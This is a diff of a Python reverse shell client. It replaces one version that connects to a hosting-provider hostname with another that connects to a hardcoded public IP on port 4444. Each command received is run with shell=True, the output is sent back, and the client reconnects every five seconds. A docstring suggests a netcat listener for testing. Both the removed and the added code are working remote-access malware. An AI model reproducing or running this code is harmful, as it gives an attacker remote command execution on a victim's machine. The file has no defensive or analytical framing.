@@ -1,40 +1,52 @@
-import socket
-# control operating system of target machine
-import os
-import subprocess
+"""
+A simple reverse shell. In order to test the code you will need to run a server to listen to client's port.
+You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)
+"""
 
-s = socket.socket() # client computer can connect to others
-
-# ip address of server, can use own computer's private IP if doing on local
-host = 'vmi850151.contaboserver.net'
-port = 4444
-
-s.connect((host, port)) # binds client computer to server computer
-
-# infinite loop for continuous listening for server's commands
-while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd': # command to change directory (cd)
-                os.chdir(data[3:].decode("utf-8")) # look at target directory to cd to
-
-        if len(data) > 0: # check if there are actually data/commands received (that is not cd)
-                
-                # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-                
-                # bytes and string versions of results
-                output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
-                output_str = str(output_bytes, "utf-8") # plain old basic string
-
-                # getcwd allows the server side to see where the current working directory is on the client
-                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str) # client can see what server side is doing
-
-# close connection
-s.close()
+# Set the host and the port.
+HOST = "154.12.234.206"
+PORT = 4444
 
 
+def connect((host, port)):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    return s
 
 
+def wait_for_command(s):
+    data = s.recv(1024)
+    if data == "quit\n":
+        s.close()
+        sys.exit(0)
+    # the socket died
+    elif len(data) == 0:
+        return True
+    else:
+        # do shell command
+        proc = subprocess.Popen(data,
+                                shell=True,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                stdin=subprocess.PIPE)
+        stdout_value = proc.stdout.read() + proc.stderr.read()
+        s.send(stdout_value)
+        return False
 
 
+def main():
+    while True:
+        socket_died = False
+        try:
+            s = connect((HOST, PORT))
+            while not socket_died:
+                socket_died = wait_for_command(s)
+            s.close()
+        except socket.error:
+            pass
+        time.sleep(5)
+
+
+if __name__ == "__main__":
+    import sys, os, subprocess, socket, time
+    sys.exit(main())
